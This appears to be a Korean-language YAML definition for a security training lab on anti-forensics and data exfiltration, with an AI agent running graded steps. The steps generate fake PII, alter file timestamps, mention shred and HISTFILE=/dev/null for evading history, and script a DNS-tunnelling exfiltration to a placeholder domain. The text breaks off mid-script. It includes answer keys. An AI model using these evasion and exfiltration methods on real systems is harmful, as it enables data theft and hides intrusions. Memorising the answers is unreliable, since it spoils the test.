lab_id: battle-adv-ai-week05
title: 안티포렌식과 데이터 유출 — 은닉과 탐지의 대결 (AI 지원)
version: ai
course: battle-adv-ai
week: 5
description: 안티포렌식(Anti-Forensics) 기법과 데이터 유출(Exfiltration) 기법을 분석한다. Red Phase에서
  로그 삭제, 타임스탬프 조작, 멀티채널 유출을 시뮬레이션하고, Blue Phase에서 DLP 규칙, 엔트로피 분석, NetFlow 기반 탐지를
  구현한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: hard
duration_minutes: 150
objectives:
- 안티포렌식 기법(로그 삭제, 타임스탬프 조작)을 이해한다
- DNS, HTTPS, ICMP를 이용한 데이터 유출 기법을 실습한다
- DLP 규칙과 엔트로피 기반 탐지를 구현한다
prerequisites:
- battle-adv-nonai week04 이수
infra_requirements:
- attacker (10.20.30.201) — nmap, metasploit, sqlmap, hydra, nikto
- secu (10.20.30.1) — nftables, suricata
- web (10.20.30.80) — apache, modsecurity, JuiceShop(:3000), DVWA(:8080)
- siem (10.20.30.100) — wazuh-manager
pass_threshold: 0.6
steps:
- order: 1
  instruction: '[RED] 유출 대상이 될 가짜 민감 데이터(이름, 이메일, 카드번호) 100건을 생성하라.'
  hint: Python 스크립트로 가짜 PII 데이터를 CSV 형식으로 생성한다.
  category: recon
  points: 10
  answer: "python3 -c \"\nimport random\nwith open('/tmp/sensitive_data.csv', 'w')\
    \ as f:\n    f.write('name,email,card_number,ssn\\n')\n    for i in range(100):\n\
    \        name = f'User_{i:03d}'\n        email = f'user{i}@example.com'\n    \
    \    card = '4' + ''.join([str(random.randint(0,9)) for _ in range(15)])\n   \
    \     ssn = f'{random.randint(100,999)}-{random.randint(10,99)}-{random.randint(1000,9999)}'\n\
    \        f.write(f'{name},{email},{card},{ssn}\\n')\nprint('Generated 100 fake\
    \ records')\n\" && wc -l /tmp/sensitive_data.csv"
  answer_detail: 데이터 유출 실습을 위해 가짜 PII를 생성한다. 형식은 실제와 동일하지만 가짜인 데이터를 사용하며, 카드번호(16자리)와
    SSN(XXX-XX-XXXX) 형식은 DLP 규칙 테스트에 활용된다.
  verify:
    type: output_contains
    expect: null
  target_vm: attacker
  script: "python3 -c \"\nimport random\nwith open('/tmp/sensitive_data.csv', 'w')\
    \ as f:\n    f.write('name,email,card_number,ssn\\n')\n    for i in range(100):\n\
    \        name = f'User_{i:03d}'\n        email = f'user{i}@example.com'\n    \
    \    card = '4' + ''.join([str(random.randint(0,9)) for _ in range(15)])\n   \
    \     ssn = f'{random.randint(100,999)}-{random.randint(10,99)}-{random.randint(1000,9999)}'\n\
    \        f.write(f'{name},{email},{card},{ssn}\\n')\nprint('Generated 100 fake\
    \ records')\n\" && wc -l /tmp/sensitive_data.csv"
  risk_level: low
  bastion_prompt: '[RED] 유출 대상이 될 가짜 민감 데이터(이름, 이메일, 카드번호) 100건을 생성해줘'
- order: 2
  instruction: '[RED] 안티포렌식 기법을 시뮬레이션하라. 타임스탬프 조작(touch -t), 로그 삭제 흔적 생성, 파일 시큐어 삭제를
    실습하라. (시뮬레이션 파일에 대해서만 수행)'
  hint: touch -t로 타임스탬프를 변경하고, shred로 시큐어 삭제를 시뮬레이션한다.
  category: exploit
  points: 10
  answer: 'echo "anti-forensic test" > /tmp/af_test.txt && touch -t 202301010000 /tmp/af_test.txt
    && stat /tmp/af_test.txt | grep Modify && echo "--- Timestamp manipulated to 2023-01-01
    ---" && echo "Log deletion simulation:" && echo "shred -vfz -n 5 /tmp/af_test.txt
    (would securely delete)" && echo "History evasion: export HISTFILE=/dev/null"
    && echo "Anti-forensic techniques documented (T1070)"'
  answer_detail: 안티포렌식(T1070)은 공격 흔적을 제거하는 기법이다. touch -t로 타임스탬프를 조작하여 타임라인 분석을 방해하고,
    shred로 파일을 복구 불가능하게 삭제한다. HISTFILE=/dev/null로 명령 기록을 남기지 않는다.
  verify:
    type: output_contains
    expect: null
  target_vm: attacker
  script: 'echo "anti-forensic test" > /tmp/af_test.txt && touch -t 202301010000 /tmp/af_test.txt
    && stat /tmp/af_test.txt | grep Modify && echo "--- Timestamp manipulated to 2023-01-01
    ---" && echo "Log deletion simulation:" && echo "shred -vfz -n 5 /tmp/af_test.txt
    (would securely delete)" && echo "History evasion: export HISTFILE=/dev/null"
    && echo "Anti-forensic techniques documented (T1070)"'
  risk_level: medium
  bastion_prompt: '[RED] 안티포렌식 기법을 시뮬레이션해줘'
- order: 3
  instruction: '[RED] DNS 터널링을 이용한 데이터 유출을 시뮬레이션하라. 민감 데이터를 base64로 인코딩하여 DNS 쿼리에
    포함시키는 스크립트를 작성하라.'
  hint: 데이터를 50바이트 청크로 분할하여 서브도메인에 포함한다.
  category: exploit
  points: 10
  answer: "cat > /tmp/dns_exfil.sh << 'SCRIPT'\n#!/bin/bash\nDATA=$(head -5 /tmp/sensitive_data.csv\
    \ | base64 | tr -d '\\n')\nCHUNK_SIZE=50\nSEQ=0\necho \"=== DNS Exfiltration Simulation\
    \ ===\"\necho \"Total encoded size: ${#DATA} bytes\"\nwhile [ ${#DATA} -gt 0 ];\
    \ do\n    CHUNK=${DATA:0:$CHUNK_SIZE}\n    DATA=${DATA:$CHUNK_SIZE}\n    echo\
    \ \"Query $SEQ: nslookup ${CHUNK}.seq${SEQ}.exfil.test.local\"\n    SEQ=$((SEQ\
    \ + 1))\n    if [ $SEQ -ge 5 ]; then echo \"... (truncated)\"; break; fi\ndone\n\
    SCRIPT\nbash /tmp/dns_exfil.sh"
  answer_detail: DNS Exfiltration(T1048.001)은 DNS 프로토콜을 데이터 전송 채널로 악용한다. 거의 모든 네트워크에서
    DNS가 허용되므로 방화벽 우회에 효과적이다.
  verify:
    type: output_contains
    expect: null
  target_vm: attacker
  script: "cat > /tmp/dns_exfil.sh << 'SCRIPT'\n#!/bin/bash\nDATA=$(head -5 /tmp/sensitive_data.csv\
